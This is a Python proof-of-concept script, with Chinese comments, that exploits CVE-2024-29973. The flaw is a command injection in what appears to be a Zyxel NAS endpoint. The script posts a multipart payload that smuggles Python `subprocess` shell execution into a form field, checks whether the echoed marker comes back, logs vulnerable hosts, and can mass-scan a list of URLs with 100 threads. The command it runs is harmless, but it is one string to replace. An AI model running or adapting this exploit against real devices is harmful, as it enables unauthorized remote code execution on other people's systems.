# 导包
import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止他报错
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 指纹模块
def banner():
    banner = """

 ██░ ██  ▄▄▄       ██▀███  ▓█████▄  ▒█████    ▄████ 
▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒
▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌▒██░  ██▒▒██░▄▄▄░
░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌▒██   ██░░▓█  ██▓
░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ░ ████▓▒░░▒▓███▀▒
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░   ░ 
 ░  ░░ ░  ░   ▒     ░░   ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░ 
 ░  ░  ░      ░  ░   ░        ░        ░ ░        ░ 
                            ░                       
                                                                                                                    
                                version:1.1.0                     
                                author:Hardog
"""
    print(banner)

# poc模块
def poc(target):
    url = target+"/cmd,/simZysh/register_main/setCookie"
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
            "Connection": "close",
            "Content-Length": "255",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei",
            "Accept-Encoding": "gzip"
    }


    data="""------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="c0"\r\n\r\nstorage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("echo SGFjayBCeSBQcmF5", shell=True)#\r\n------WebKitFormBoundarygcflwtei--"""
    try:
        res = requests.post(data=data,url=url,headers=headers,verify=False,timeout=10)
        if  res.status_code == 200 and "SGFjayBCeSBQcmF5" in res.text:
                    print(f"{GREEN}[+] [CVE-2024-29973] {target}\n{RESET}")
                    with open ('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
        else :
            print(f"[-] 不存在此漏洞!")
    except Exception as e:
        print("[*] 无法访问")

# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a testing tool")
    # -u指定单个url检测， -f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == "__main__":
    main()